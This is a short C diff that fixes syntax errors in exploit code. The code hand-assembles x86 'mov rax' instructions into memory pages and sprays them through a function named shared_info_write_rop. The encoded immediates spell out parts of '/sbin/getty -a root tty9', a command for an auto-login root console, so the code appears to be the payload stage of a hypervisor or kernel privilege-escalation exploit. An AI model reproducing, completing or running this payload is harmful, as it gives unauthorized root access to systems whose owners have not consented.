@@ -230,7 +230,7 @@ static inline void shared_info_write_page(char *base)
 
 	// mov rax, 0x003979747420746f
 	*(base++) = 0x48;
-	*(base++) = 0xb8
+	*(base++) = 0xb8;
 	*(u64*)base = 0x003979747420746f;
         base += sizeof(u64);
 
@@ -239,7 +239,7 @@ static inline void shared_info_write_page(char *base)
 
 	// mov rax, 0x6f72612d20797474
 	*(base++) = 0x48;
-	*(base++) = 0xb8
+	*(base++) = 0xb8;
         *(u64*)base = 0x6f72612d20797474;
         base += sizeof(u64);
 
@@ -248,7 +248,7 @@ static inline void shared_info_write_page(char *base)
 
 	// mov rax, 0x65672f6e6962732f
 	*(base++) = 0x48;
-	*(base++) = 0xb8
+	*(base++) = 0xb8;
         *(u64*)base = 0x65672f6e6962732f;
         base += sizeof(u64);
 
@@ -319,7 +319,7 @@ static inline void shared_info_write_page(char *base)
 static inline void shared_info_write_rop(char *base, u32 size)
 {
 	u32 i;
-	for (i = 0 i < size; i += 4096)
+	for (i = 0; i < size; i += 4096)
 		shared_info_write_page(base + i);
 }
 
